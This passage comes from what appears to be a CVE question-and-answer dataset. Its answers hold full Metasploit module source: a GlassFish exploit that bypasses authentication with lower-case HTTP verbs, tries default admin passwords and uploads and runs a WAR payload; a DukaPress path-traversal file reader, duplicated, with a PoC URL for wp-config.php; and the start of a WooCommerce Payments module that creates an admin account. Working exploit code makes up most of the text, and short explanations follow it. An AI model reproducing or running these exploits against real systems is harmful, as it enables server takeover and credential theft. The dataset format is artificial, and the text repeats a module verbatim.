OptBool.new('SSL', [ false, 'Negotiate SSL for outgoing connections', false])        ])  end  #  # Send GET or POST request, and return the response  #  def send_glassfish_request(path, method, session='', data=nil, ctype=nil)    headers = {}    headers['Cookie'] = \"JSESSIONID=#{session}\" unless session.blank?    headers['Content-Type'] = ctype if ctype    headers['Connection'] = 'keep-alive'    headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'    headers['Accept-Language'] = 'en-US,en;q=0.5'    headers['Accept-Encoding'] = 'gzip, deflate, br'    res = send_request_raw({      'uri'     => path,      'method'  => method,      'data'    => data,      'headers' => headers,    })    unless res      fail_with(Failure::Unknown, 'Connection timed out')    end    res  end  #  # Return target  #  def auto_target(session, res, version)    print_status(\"Attempting to automatically select a target...\")    res = query_serverinfo(session, version)    return nil unless res    return nil unless res.body    plat = detect_platform(res.body)    arch = detect_arch(res.body)    # No arch or platform found?    return nil if !arch || !plat    # see if we have a match    targets.each do |t|      return t if (t['Platform'] == plat) && (t['Arch'] == arch)    end    # no matching target found    nil  end  #  # Return platform (win, linux, or osx)  #  def detect_platform(body)    body.each_line do |ln|      ln.chomp!      case ln      when /os\\.name = (.*)/        os = $1        case os        when /Windows/          return 'win'        when /Linux/          return 'linux'        when /Mac OS X/          return 'osx'        end      end    end    return 'java'  end  #  # Return ARCH  #  def detect_arch(body)    body.each_line do |ln|      ln.chomp!      case ln      when /os\\.arch = (.*)/        ar = $1        case ar        when 'x86', 'i386', 'i686'          return ARCH_X86        when 'x86_64', 'amd64'          return ARCH_X64        end      end    end  end  #  # Return server information  #  def query_serverinfo(session,version)    res = ''    if version == '2.x' || version == '9.x'      path = \"/appServer/jvmReport.jsf?instanceName=server&pageTitle=JVM%20Report\"      res = send_glassfish_request(path, @verbs['GET'], session)    else      path = \"/common/appServer/jvmReport.jsf?pageTitle=JVM%20Report\"      res = send_glassfish_request(path, @verbs['GET'], session)      if !res || res.code != 200 || res.body.to_s !~ /Operating System Information/        path = \"/common/appServer/jvmReport.jsf?reportType=summary&instanceName=server\"        res = send_glassfish_request(path, @verbs['GET'], session)      end    end    if !res || res.code != 200      print_error(\"Failed: Error requesting #{path}\")      return nil    end    res  end  #  # Return viewstate and entry before deleting a GlassFish application  #  def get_delete_info(session, version, app='')    if version == '2.x' || version == '9.x'      path = '/applications/webApplications.jsf'      res = send_glassfish_request(path, @verbs['GET'], session)      if !res || res.code != 200        print_error(\"Failed (#{res.code.to_s}): Error requesting #{path}\")        return nil      end      input_id = \"javax.faces.ViewState\"      p = /input type=\"hidden\" name=\"#{input_id}\" id=\"#{input_id}\" value=\"(j_id\\d+:j_id\\d+)\"/      viewstate = res.body.scan(p)[0][0]      entry = nil      p = /<a id=\"(.*)col1:link\" href=\"\\/applications\\/webApplicationsEdit.jsf.*appName=(.*)\">/      results = res.body.scan(p)      results.each do |hit|        if hit[1] =~ /^#{app}/          entry = hit[0]          entry << \"col0:select\"        end      end    else      path = '/common/applications/applications.jsf?bare=true'      res = send_glassfish_request(path, @verbs['GET'], session)      if !res || res.code != 200        print_error(\"Failed (#{res.code.to_s}): Error requesting #{path}\")        return nil      end      viewstate = get_viewstate(res.body)      entry = nil      p = /<a id=\"(.*)col1:link\" href=\"\\/common\\/applications\\/applicationEdit.jsf.*appName=(.*)\">/      results = res.body.scan(p)      results.each do |hit|        if hit[1] =~ /^#{app}/          entry = hit[0]          entry << \"col0:select\"        end      end    end    if !viewstate      print_error(\"Failed: Error getting ViewState\")      return nil    elsif !entry      print_error(\"Failed: Error getting the entry to delete\")    end    return viewstate, entry  end  #  # Send an \"undeploy\" request to Glassfish and remove our backdoor  #  def undeploy(viewstate, session, entry)    #Send undeployment request    data  = [    \"propertyForm%3AdeployTable%3AtopActionsGroup1%3Afilter_list=\",    \"&propertyForm%3AdeployTable%3AtopActionsGroup1%3Afilter_submitter=false\",    \"&#{Rex::Text.uri_encode(entry)}=true\",    \"&propertyForm%3AhelpKey=ref-applications.html\",    \"&propertyForm_hidden=propertyForm_hidden\",    \"&javax.faces.ViewState=#{Rex::Text.uri_encode(viewstate)}\",    \"&com_sun_webui_util_FocusManager_focusElementId=propertyForm%3AdeployTable%3AtopActionsGroup1%3Abutton1\",    \"&javax.faces.source=propertyForm%3AdeployTable%3AtopActionsGroup1%3Abutton1\",    \"&javax.faces.partial.execute=%40all\",    \"&javax.faces.partial.render=%40all\",    \"&bare=true\",    \"&propertyForm%3AdeployTable%3AtopActionsGroup1%3Abutton1=propertyForm%3AdeployTable%3AtopActionsGroup1%3Abutton1\",    \"&javax.faces.partial.ajax=true\"    ].join()    path  = '/common/applications/applications.jsf'    ctype = 'application/x-www-form-urlencoded'    res   = send_glassfish_request(path, @verbs['POST'], session, data, ctype)    if !res      print_error(\"Undeployment failed on #{path} - No Response\")    else      if res.code < 200 || res.code >= 300        print_error(\"Undeployment failed on #{path} - #{res.code.to_s}:#{res.message.to_s}\")      end    end  end  def report_glassfish_version(banner)    report_note(      host: rhost,      type: 'glassfish.banner',      data: banner,      update: :unique_data    )  end  #  # Return GlassFish's edition (Open Source or Commercial) and version (2.x, 3.0, 3.1, 9.x) and  # banner (ex: Sun Java System Application Server 9.x)  #  def get_version(res)    # Extract banner from response    banner = res.headers['Server']    # Default value for edition and glassfish version    edition = 'Commercial'    version = 'Unknown'    # Set edition (Open Source or Commercial)    p = /(Open Source|Sun GlassFish Enterprise Server|Sun Java System Application Server)/    edition = 'Open Source' if banner =~ p    # Set version.  Some GlassFish servers return banner \"GlassFish v3\".    if banner =~ /(GlassFish Server|Open Source Edition) {1,}(\\d\\.\\d)/      version = $2    elsif banner =~ /GlassFish v(\\d)/ && version == 'Unknown'      version = $1    elsif banner =~ /Sun GlassFish Enterprise Server v2/ && version == 'Unknown'      version = '2.x'    elsif banner =~ /Sun Java System Application Server 9/ && version == 'Unknown'      version = '9.x'    end    if version == nil || version == 'Unknown'      print_status(\"Unsupported version: #{banner}\")    end    report_glassfish_version(banner)    return edition, version, banner  end  #  # Return the formatted version of the POST data  #  def format_2_x_war(boundary,name,value=nil, war=nil)    data = ''    data << boundary    data << \"\\r\Content-Disposition: form-data; name=\\\"form:title:sheet1:section1:prop1:fileupload\\\"; \"    data << \"filename=\\\"#{name}.war\\\"\\r\Content-Type: application/octet-stream\\r\\\r\\"    data << war    data << \"\\r\\"    return data  end  #  # Return the formatted version of the POST data  #  def format(boundary,name,value=nil, war=nil)    data = ''    if war      data << boundary      data << \"\\r\Content-Disposition: form-data; name=\\\"form:sheet1:section1:prop1:fileupload\\\"; \"      data << \"filename=\\\"#{name}.war\\\"\\r\Content-Type: application/octet-stream\\r\\\r\\"      data << war      data << \"\\r\\"    else      data << boundary      data << \"\\r\Content-Disposition: form-data; name=\\\"#{name}\\\"\"      data << \"\\r\\\r\\"      data << \"#{value}\\r\\"    end    return data  end  #  # Return POST data and data length, based on GlassFish edition  #  def get_upload_data(opts = {})    boundary = opts[:boundary]    version = opts[:version]    war = opts[:war]    app_base = opts[:app_base]    typefield = opts[:typefield]    status_checkbox = opts[:status_checkbox]    start = opts[:start]    viewstate = opts[:viewstate]    data = ''    if version == '3.0'      uploadParam_name = \"form:sheet1:section1:prop1:fileupload_com.sun.webui.jsf.uploadParam\"      uploadparam_data = \"form:sheet1:section1:prop1:fileupload\"      boundary = \"--#{boundary}\"      data = [        format(boundary, app_base, nil, war),        format(boundary, uploadParam_name, uploadparam_data),        format(boundary, \"form:sheet1:section1:prop1:extension\", \".war\"),        format(boundary, \"form:sheet1:section1:prop1:action\", \"client\"),        format(boundary, typefield, \"war\"),        format(boundary, \"form:war:psection:cxp:ctx\", app_base),        format(boundary, \"form:war:psection:nameProp:appName\", app_base),        format(boundary, \"form:war:psection:vsProp:vs\", \"\"),        format(boundary, status_checkbox, \"true\"),        format(boundary, \"form:war:psection:librariesProp:library\", \"\"),        format(boundary, \"form:war:psection:descriptionProp:description\", \"\"),        format(boundary, \"form_hidden\", \"form_hidden\"),        format(boundary, \"javax.faces.ViewState\", viewstate),        \"#{boundary}--\"      ].join()    elsif version == '2.x' || version == '9.x'      uploadParam_name = \"form:title:sheet1:section1:prop1:fileupload_com.sun.webui.jsf.uploadParam\"      uploadParam_data = \"form:title:sheet1:section1:prop1:fileupload\"      focusElementId_name = \"com_sun_webui_util_FocusManager_focusElementId\"      focusElementId_data = 'form:title:topButtons:uploadButton'      boundary = \"-----------------------------#{boundary}\"      data = [        format_2_x_war(boundary, app_base, nil, war),        format(boundary, \"form:title:sheet1:section1:type:appType\", \"webApp\"),        format(boundary, \"uploadRdBtn\", \"client\"),        format(boundary, uploadParam_name, uploadParam_data),        format(boundary, \"form:title:sheet1:section1:prop1:extension\", \".war\"),        format(boundary, \"form:title:ps:psec:nameProp:appName\", app_base),        format(boundary, \"form:title:ps:psec:cxp:ctx\", app_base),        format(boundary, \"form:title:ps:psec:vsp:vs\", \"\"),        format(boundary, status_checkbox, \"true\"),        format(boundary, \"form:title:ps:psec:librariesProp:library\", \"\"),        format(boundary, \"form:title:ps:psec:threadpoolProp:threadPool\", \"\"),        format(boundary, \"form:title:ps:psec:registryProp:registryType\", \"\"),        format(boundary, \"form:title:ps:psec:descriptionProp:description\", \"\"),        format(boundary, \"form:helpKey\", \"uploaddev.html\"),        format(boundary, \"form_hidden\", \"form_hidden\"),        format(boundary, \"javax.faces.ViewState\", viewstate),        format(boundary, focusElementId_name, focusElementId_data),        \"#{boundary}--\"      ].join()    else      boundary = \"-----------------------------#{boundary}\"      #Setup dynamic arguments      num1 = start.to_i      num2 = num1 + 14      num3 = num2 + 2      num4 = num3 + 2      num5 = num4 + 2      num6 = num5 + 2      num7 = num6 + 1      id0 = num4      id1 = num4 + 1      id2 = num4 + 2      id3 = num4 + 3      id4 = num4 + 4      id5 = num4 + 5      id6 = num4 + 6      id7 = num4 + 7      id8 = num4 + 8      id9 = num4 + 9      uploadParam_name  = \"form:sheet1:section1:prop1:fileupload_com.sun.webui.jsf.uploadParam\"      uploadParam_value = \"form:sheet1:section1:prop1:fileupload\"      focusElementId_name = \"com_sun_webui_util_FocusManager_focusElementId\"      focusElementId_data = \"form:title2:bottomButtons:uploadButton\"      data = [        format(boundary,\"uploadRdBtn\",\"client\"),        ## web service        format(boundary, app_base, nil, war),        ## sheet1        format(boundary, uploadParam_name, uploadParam_value),        format(boundary,\"form:sheet1:section1:prop1:extension\",\".war\"),        format(boundary,\"form:sheet1:section1:prop1:action\",\"client\"),        format(boundary,\"form:sheet1:sun_propertySheetSection#{num1.to_s}:type:appType\",\"war\"),        format(boundary,\"form:appClient:psection:nameProp:appName\",\"#{app_base}\"),        format(boundary,\"form:appClient:psection:descriptionProp:description\"),        ## war        format(boundary,\"form:war:psection:cxp:ctx\",\"#{app_base}\"),        format(boundary,\"form:war:psection:nameProp:appName\",\"#{app_base}\"),        format(boundary,\"form:war:psection:vsProp:vs\"),        format(boundary,\"form:war:psection:enableProp:sun_checkbox\" + id1.to_s,\"true\"),        format(boundary,\"form:war:psection:enableProp:sun_checkbox\" + id2.to_s,\"true\"),        format(boundary,\"form:war:psection:enableProp:sun_checkbox\" + id3.to_s,\"true\"),        format(boundary,\"form:war:psection:enableProp:sun_checkbox\" + id4.to_s,\"true\"),        format(boundary,\"form:war:psection:enableProp:sun_checkbox\" + id5.to_s,\"true\"),        format(boundary,\"form:war:psection:enableProp:sun_checkbox\" + id6.to_s,\"true\"),        format(boundary,\"form:war:psection:enableProp:sun_checkbox\" + id7.to_s,\"true\"),        format(boundary,\"form:war:psection:enableProp:sun_checkbox\" + id8.to_s,\"true\"),        format(boundary,\"form:war:psection:enableProp:sun_checkbox\" + id9.to_s,\"true\"),        format(boundary,\"form:other:psection:descriptionProp:description\", \"\"),        format(boundary,\"form:other:psection:librariesProp:library\", \"\"),        format(boundary,\"form:other:psection:deploymentOrder:deploymentOrder\", \"\"),        format(boundary,\"form:other:psection:implicitCdi:implicitCdi\", \"true\"),        format(boundary,\"form:other:psection:enableProp:sun_checkbox44\",\"true\"),        format(boundary,\"form:war:psection:enableProp:sun_checkbox42\",\"true\"),        format(boundary,\"form:other:psection:vsProp:vs\",\"\"),        format(boundary,\"form:rar:psection:implicitCdi:implicitCdi\",\"true\"),        format(boundary,\"form:rar:psection:deploymentOrder:deploymentOrder\",\"\"),        format(boundary,\"form:rar:psection:enableProp:sun_checkbox40\",\"true\"),        format(boundary,\"form:other:psection:nameProp:appName\", app_base),        format(boundary,\"form:rar:psection:nameProp:appName\", app_base),        format(boundary,\"form:jar:psection:nameProp:appName\", app_base),        format(boundary,\"form:ear:psection:nameProp:appName\", app_base),        format(boundary,\"form:ear:psection:descriptionProp:description\",\"\"),        format(boundary,\"form:jar:psection:deploymentOrder:deploymentOrder\", \"\"),        format(boundary,\"form:jar:psection:implicitCdi:implicitCdi\",\"true\"),        format(boundary,\"form:ear:psection:jw:jwc\",\"true\"),        format(boundary,\"form:ear:psection:vsProp:vs\",\"\"),        format(boundary,\"form:appClient:psection:deploymentOrder:deploymentOrder\",\"\"),        format(boundary,\"form:jar:psection:enableProp:sun_checkbox38\",\"true\"),        format(boundary,\"form:jar:psection:descriptionProp:description\", \"\"),        format(boundary,\"form:ear:psection:implicitCdi:implicitCdi\",\"true\"),        format(boundary,\"form:appClient:psection:implicitCdi:implicitCdi\",\"true\"),        format(boundary,\"form:ear:psection:enableProp:sun_checkbox36\",\"true\"),        format(boundary,\"form:war:psection:deploymentOrder:deploymentOrder\",\"\"),        format(boundary,\"form:jar:psection:librariesProp:library\",\"\"),        format(boundary,\"form:appClient:psection:jw:jwt\",\"true\"),        format(boundary,\"form:ear:psection:librariesProp:library\", \"\"),        format(boundary,\"form:sheet1:sun_propertySheetSection23:type:appType\",\"war\"),        format(boundary,\"form:ear:psection:deploymentOrder:deploymentOrder\",\"\"),        format(boundary,\"form:rar:psection:descriptionProp:description\",\"\"),        format(boundary,\"form:war:psection:implicitCdi:implicitCdi\",\"true\"),        format(boundary,\"form:war:psection:librariesProp:library\"),        format(boundary,\"form:war:psection:descriptionProp:description\"),        format(boundary,\"form_hidden\",\"form_hidden\"),        format(boundary,\"javax.faces.ViewState\",\"#{viewstate}\"),        format(boundary, focusElementId_name, focusElementId_data)      ].join()      item_list_name = \"form:targetSection:targetSectionId:addRemoveProp:commonAddRemove_item_list\"      item_list_data = \"|server|com.sun.webui.jsf.separator|\"      item_value_name = \"form:targetSection:targetSectionId:addRemoveProp:commonAddRemove_list_value\"      item_value_data = \"server\"      data << format(boundary, item_list_name, item_list_data)      data << format(boundary, item_value_name, item_value_data)      data << \"#{boundary}--\"      data << \"\\r\\\r\\"    end    return data  end  def get_viewstate(body)      noko = Nokogiri::HTML(body)      inputs = noko.search('input')      hidden_inputs = []      inputs.each {|e| hidden_inputs << e if e.attributes['type'].text == 'hidden'}      hidden_inputs.each do |e|        if e.attributes['name'].text == 'javax.faces.ViewState'          return e.attributes['value'].text        end      end      ''  end  #  # Upload our payload, and execute it.  This function will also try to automatically  # clean up after itself.  #  def upload_exec(opts = {})    session = opts[:session]    app_base = opts[:app_base]    jsp_name = opts[:jsp_name]    war = opts[:war]    edition = opts[:edition]    version = opts[:version]    if version == '2.x' || version == '9.x'      path = \"/applications/upload.jsf?appType=webApp\"      res = send_glassfish_request(path, @verbs['GET'], session)      # Obtain some properties      p2 = /input type=\"checkbox\" id=\"form:title:ps:psec:enableProp:sun_checkbox\\d+\" name=\"(.*)\" checked/mi      viewstate       = get_viewstate(res.body)      status_checkbox = res.body.scan(p2)[0][0]      boundary        = rand_text_alphanumeric(28)    else      path = \"/common/applications/uploadFrame.jsf\"      res = send_glassfish_request(path, @verbs['GET'], session)      # Obtain some properties      res.body =~ /propertySheetSection(\\d{3})/      start = $1      p2 = /select class=\"MnuStd_sun4\" id=\"form:sheet1:sun_propertySheetSection.*:type:appType\" name=\"(.*)\" size/      p3 = /input type=\"checkbox\" id=\"form:war:psection:enableProp:sun_checkbox.*\" name=\"(.*)\" checked/      rnd_text = rand_text_alphanumeric(29)      viewstate       = get_viewstate(res.body)      typefield       = res.body.scan(p2)[0][0]      status_checkbox = res.body.scan(p3)[0][0]      boundary        = (edition == 'Open Source') ? rnd_text[0,15] : rnd_text    end    # Get upload data    if version == '3.0'      ctype = \"multipart/form-data; boundary=#{boundary}\"    elsif version == '2.x' || version == '9.x'      ctype = \"multipart/form-data; boundary=---------------------------#{boundary}\"      typefield = ''      start = ''    else      ctype = \"multipart/form-data; boundary=---------------------------#{boundary}\"    end    post_data = get_upload_data({      :boundary => boundary,      :version => version,      :war => war,      :app_base => app_base,      :typefield => typefield,      :status_checkbox => status_checkbox,      :start => start,      :viewstate => viewstate    })    # Upload our payload    if version == '2.x' || version == '9.x'      path = '/applications/upload.jsf?form:title:topButtons:uploadButton=%20%20OK%20%20'    else      path  = '/common/applications/uploadFrame.jsf?'      path << 'form:title:topButtons:uploadButton=Processing...'      path << '&bare=false'    end    res = send_glassfish_request(path, @verbs['POST'], session, post_data, ctype)    # Print upload result    if res && res.code == 302      print_good(\"Successfully Uploaded\")    else      print_error(\"Error uploading #{res.code}\")      return    end    #Execute our payload using the application interface (no need to use auth bypass technique)    jsp_path = normalize_uri(target_uri.path, app_base, \"#{jsp_name}.jsp\")    nclient = Rex::Proto::Http::Client.new(datastore['RHOST'], datastore['APP_RPORT'],      {        'Msf'        => framework,        'MsfExploit' => self,      }    )    print_status(\"Executing #{jsp_path}...\")    req = nclient.request_raw({      'uri'     => jsp_path,      'method'  => 'GET',    })    if req      res = nclient.send_recv(req, 90)    else      print_status(\"Error: #{rhost} did not respond on #{app_rport}.\")    end    # Sleep for a bit before cleanup    select(nil, nil, nil, 5)    # Start undeploying    print_status(\"Getting information to undeploy...\")    viewstate, entry = get_delete_info(session, version, app_base)    if !viewstate      fail_with(Failure::Unknown, \"Unable to get viewstate\")    elsif (not entry)      fail_with(Failure::Unknown, \"Unable to get entry\")    end    print_status(\"Undeploying #{app_base}...\")    undeploy(viewstate, session, entry)    print_status(\"Undeployment complete.\")  end  def init_loginscanner    @cred_collection = Metasploit::Framework::CredentialCollection.new    @scanner = Metasploit::Framework::LoginScanner::Glassfish.new(      configure_http_login_scanner(        cred_details: @cred_collection,        connection_timeout: 5,        http_username: datastore['HttpUsername'],        http_password: datastore['HttpPassword']      )    )  end  def report_auth_bypass(version)    report_vuln(      name: 'GlassFish HTTP Method Authentication Bypass',      info: \"The remote service has a vulnerable version of GlassFish (#{version}) that allows the \" \\            'attacker to bypass authentication by sending an HTTP verb in lower-case.',      host: rhost,      port: rport,      proto: 'tcp',      refs: self.references    )  end  def try_glassfish_auth_bypass(version)    sid = nil    if version == '2.x' || version == '9.x'      print_status(\"Trying auth bypass...\")      res = send_glassfish_request('/applications/upload.jsf', 'get')      title = '<title>Deploy Enterprise Applications/Modules</title>'      if res && res.code.to_i == 200 && res.body.include?(title)        sid = res.get_cookies.to_s.scan(/JSESSIONID=(.*); */).flatten.first      end    else      # 3.0      print_status(\"Trying auth bypass...\")      res = send_glassfish_request('/common/applications/uploadFrame.jsf', 'get')      title = '<title>Deploy Applications or Modules'      if res && res.code.to_i == 200 && res.body.include?(title)        sid = res.get_cookies.to_s.scan(/JSESSIONID=(.*); */).flatten.first      end    end    report_auth_bypass(version) if sid    sid  end  def my_target_host    \"http://#{rhost.to_s}:#{rport.to_s}#{normalize_uri(target_uri.path)}\"  end  def service_details    super.merge({ post_reference_name: self.refname })  end  def try_normal_login(version)    init_loginscanner    case version    when /2\\.x|9\\.x/      @cred_collection.prepend_cred(        Metasploit::Framework::Credential.new(        public: 'admin',        private: 'adminadmin',        private_type: :password      ))    when /^3\\./      @cred_collection.prepend_cred(        Metasploit::Framework::Credential.new(        public: 'admin',        private: '',        private_type: :password      ))    end    @cred_collection.prepend_cred(      Metasploit::Framework::Credential.new(      public: datastore['USERNAME'],      private: datastore['PASSWORD'],      private_type: :password    ))    @scanner.send_request({'uri'=>normalize_uri(target_uri.path)})    @scanner.version = version    @cred_collection.each do |raw|      cred = raw.to_credential      print_status(\"Trying to login as #{cred.public}:#{cred.private}\")      result = @scanner.attempt_login(cred)      if result.status == Metasploit::Model::Login::Status::SUCCESSFUL        store_valid_credential(user: cred.public, private: cred.private) # changes service_name to http || https        return @scanner.jsession      end    end    nil  end  def attempt_login(version)    sid = nil    if version =~ /3\\.0|2\\.x|9\\.x/      sid = try_glassfish_auth_bypass(version)      return sid if sid    end    try_normal_login(version)  end  def make_war(selected_target)    p = exploit_regenerate_payload(selected_target.platform, selected_target.arch)    jsp_name = rand_text_alphanumeric(4+rand(32-4))    app_base = rand_text_alphanumeric(4+rand(32-4))    war = p.encoded_war({      :app_name    => app_base,      :jsp_name    => jsp_name,      :arch        => selected_target.arch,      :platform    => selected_target.platform    }).to_s    return app_base, jsp_name, war  end  def exploit    # Invoke index to gather some info    res = send_glassfish_request('/common/index.jsf', 'GET')    if res.code == 302      res = send_glassfish_request('/login.jsf', 'GET')    end    # Get GlassFish version    edition, version, banner = get_version(res)    print_status(\"Glassfish edition: #{banner}\")    # Set HTTP verbs. Lower-case is used to bypass auth on v3.0    @verbs = {      'GET'  => (version == '3.0' || version == '2.x' || version == '9.x') ? 'get' : 'GET',      'POST' => (version == '3.0' || version == '2.x' || version == '9.x') ? 'post' : 'POST',    }    sid = attempt_login(version)    unless sid      fail_with(Failure::NoAccess, \"#{my_target_host()} - GlassFish - Failed to authenticate\")    end    selected_target = target.name =~ /Automatic/ ? auto_target(sid, res, version) : target    fail_with(Failure::NoTarget, \"Unable to automatically select a target\") unless selected_target    app_base, jsp_name, war = make_war(selected_target)    print_status(\"Uploading payload...\")    res = upload_exec({      :session => sid,      :app_base => app_base,      :jsp_name => jsp_name,      :war => war,      :edition => edition,      :version => version    })  endend       Question: CVE-2011-0807[/INST] CVE-2011-0807 is a vulnerability affecting Sun/Oracle GlassFish Server. It allows an attacker to gain remote code execution by sending a malicious WAR file to the affected GlassFish instance. The vulnerability exists due to improper handling of user-supplied files during the deployment process.To exploit this vulnerability, an attacker needs to create a malicious WAR file containing their payload and deploy it to the targeted GlassFish instance. They can achieve this by sending a specially crafted HTTP request to the GlassFish server's admin interface. Once the malicious WAR file is deployed, the GlassFish server executes the contained code, giving the attacker remote code execution capabilities.This vulnerability affects GlassFish Server versions prior to those with proper security enhancements. It is recommended to upgrade to a newer, secured version of GlassFish as soon as possible to mitigate this risk. Additionally, implementing proper access controls and restricting unauthorized access to the GlassFish administration interface can help prevent potential attacks."}
{"query": "CVE-2014-8799", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Report  include Msf::Exploit::Remote::HTTP::Wordpress  include Msf::Auxiliary::Scanner  def initialize(info = {})    super(update_info(info,      'Name'           => 'WordPress DukaPress Plugin File Read Vulnerability',      'Description'    => %q{        This module exploits a directory traversal vulnerability in WordPress Plugin        \"DukaPress\" version <= 2.5.3, allowing to read arbitrary files with the        web server privileges.      },      'References'     =>        [          ['EDB', '35346'],          ['CVE', '2014-8799'],          ['WPVDB', '7731'],          ['OSVDB', '115130']        ],      'Author'         =>        [          'Kacper Szurek', # Vulnerability discovery          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit module        ],      'License'        => MSF_LICENSE    ))    register_options(      [        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 7 ])      ])  end  def check    check_plugin_version_from_readme('dukapress', '2.5.4')  end  def run_host(ip)    traversal = \"../\" * datastore['DEPTH']    filename = datastore['FILEPATH']    filename = filename[1, filename.length] if filename =~ /^\\//    res = send_request_cgi({      'method' => 'GET',      'uri'    => normalize_uri(wordpress_url_plugins, 'dukapress', 'lib', 'dp_image.php'),      'vars_get' =>        {          'src' => \"#{traversal}#{filename}\"        }    })    if res && res.code == 200 && res.body.length > 0      print_status('Downloading file...')      print_line(\"\#{res.body}\")      fname = datastore['FILEPATH']      path = store_loot(        'dukapress.file',        'text/plain',        ip,        res.body,        fname      )      print_good(\"File saved in: #{path}\")    else      print_error(\"Nothing was downloaded. You can try to change the DEPTH parameter.\")    end  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Report  include Msf::Exploit::Remote::HTTP::Wordpress  include Msf::Auxiliary::Scanner  def initialize(info = {})    super(update_info(info,      'Name'           => 'WordPress DukaPress Plugin File Read Vulnerability',      'Description'    => %q{        This module exploits a directory traversal vulnerability in WordPress Plugin        \"DukaPress\" version <= 2.5.3, allowing to read arbitrary files with the        web server privileges.      },      'References'     =>        [          ['EDB', '35346'],          ['CVE', '2014-8799'],          ['WPVDB', '7731'],          ['OSVDB', '115130']        ],      'Author'         =>        [          'Kacper Szurek', # Vulnerability discovery          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit module        ],      'License'        => MSF_LICENSE    ))    register_options(      [        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 7 ])      ])  end  def check    check_plugin_version_from_readme('dukapress', '2.5.4')  end  def run_host(ip)    traversal = \"../\" * datastore['DEPTH']    filename = datastore['FILEPATH']    filename = filename[1, filename.length] if filename =~ /^\\//    res = send_request_cgi({      'method' => 'GET',      'uri'    => normalize_uri(wordpress_url_plugins, 'dukapress', 'lib', 'dp_image.php'),      'vars_get' =>        {          'src' => \"#{traversal}#{filename}\"        }    })    if res && res.code == 200 && res.body.length > 0      print_status('Downloading file...')      print_line(\"\#{res.body}\")      fname = datastore['FILEPATH']      path = store_loot(        'dukapress.file',        'text/plain',        ip,        res.body,        fname      )      print_good(\"File saved in: #{path}\")    else      print_error(\"Nothing was downloaded. You can try to change the DEPTH parameter.\")    end  endendEXPLOIT: # Exploit Title: DukaPress 2.5.2 Path Traversal# Date: 27-10-2014# Exploit Author: Kacper Szurek - http://security.szurek.pl# Software Link: https://downloads.wordpress.org/plugin/dukapress.2.5.2.zip# Category: webapps# CVE: CVE-2014-87991. Descriptiondp_img_resize() returns $_REQUEST['src'] if $_REQUEST['w'] and $_REQUEST['h'] doesn't exist.File: dukapress\\lib\\dp_image.phpif (!function_exists('add_action')) {    require_once('../../../../wp-load.php');}echo file_get_contents(dp_img_resize('', $_REQUEST['src'],$_REQUEST['w'], $_REQUEST['h']));http://security.szurek.pl/dukapress-252-path-traversal.html2. Proof of Concepthttp://wordpress-url/wp-content/plugins/dukapress/lib/dp_image.php?src=../../../../wp-config.php3. Solution:Update to version 2.5.4https://downloads.wordpress.org/plugin/dukapress.2.5.4.ziphttps://plugins.trac.wordpress.org/changeset/1024640/dukapress       Question: CVE-2014-8799[/INST] CVE-2014-8799 is a vulnerability affecting the WordPress plugin \"DukaPress,\" specifically versions prior to 2.5.4. This issue results from a directory traversal flaw in the `dp_image.php` file within the plugin's `lib` directory. When the function `dp_img_resize()` is called without valid width and height parameters, it falls back to returning the content of the requested file instead.An attacker can take advantage of this behavior by making a malicious request to the affected WordPress installation, such as `http://wordpress-url/wp-content/plugins/dukapress/lib/dp_image.php?src=../../../../wp-config.php`. This request would allow the attacker to read the site's `wp-config.php` file, potentially revealing sensitive information including database credentials.To mitigate this risk, users should ensure they have the latest version of the DukaPress plugin installed. Updating to version 2.5.4 or higher will prevent the directory traversal vulnerability from being exploited."}
{"query": "CVE-2023-28121", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Report  include Msf::Exploit::Remote::HTTP::Wordpress  prepend Msf::Exploit::Remote::AutoCheck  def initialize(info = {})    super(      update_info(        info,        'Name' => 'Wordpress Plugin WooCommerce Payments Unauthenticated Admin Creation',        'Description' => %q{          WooCommerce-Payments plugin for Wordpress versions 4.8', '4.8.2, 4.9', '4.9.1,          5.0', '5.0.4, 5.1', '5.1.3, 5.2', '5.2.2, 5.3', '5.3.1, 5.4', '5.4.1,          5.5', '5.5.2, and 5.6', '5.6.2 contain an authentication bypass by specifying a valid user ID number          within the X-WCPAY-PLATFORM-CHECKOUT-USER header. With this authentication bypass, a user can then use the API          to create a new user with administrative privileges on the target WordPress site IF the user ID          selected corresponds to an administrator account.        },        'License' => MSF_LICENSE,        'Author' => [          'h00die', # msf module          'Michael Mazzolini', # original discovery          'Julien Ahrens' # detailed writeup        ],        'References' => [          ['URL', 'https://www.rcesecurity.com/2023/07/patch-diffing-cve-2023-28121-to-compromise-a-woocommerce/'],          ['URL', 'https://developer.woocommerce.com/2023/03/23/critical-vulnerability-detected-in-woocommerce-payments-what-you-need-to-know/'],          ['CVE', '2023-28121']        ],        'DisclosureDate' => '2023-03-22',        'Notes' => {          'Stability' => [CRASH_SAFE],          'Reliability' => [],          'SideEffects' => [IOC_IN_LOGS]        }      )    )    register_options(      [        Opt::RPORT(80),        OptString.new('USERNAME', [true, 'User to create', '']),        OptString.new('PASSWORD', [false, 'Password to create, random if blank', '']),        OptString.new('EMAIL', [false, 'Email to create, random if blank', '']),        OptInt.new('ADMINID', [false, 'ID Number of a WordPress administrative user', 1]),        OptString.new('TARGETURI', [true, 'The URI of the Wordpress instance', '/'])      ]    )  end  def check    unless wordpress_and_online?      return Msf::Exploit::CheckCode::Safe('Server not online or not detected as wordpress')    end    vuln_versions = [      ['4.8', '4.8.2'],      ['4.9', '4.9.1'],      ['5.0', '5.0.4'],      ['5.1', '5.1.3'],      ['5.2', '5.2.2'],      ['5.3', '5.3.1'],      ['5.4', 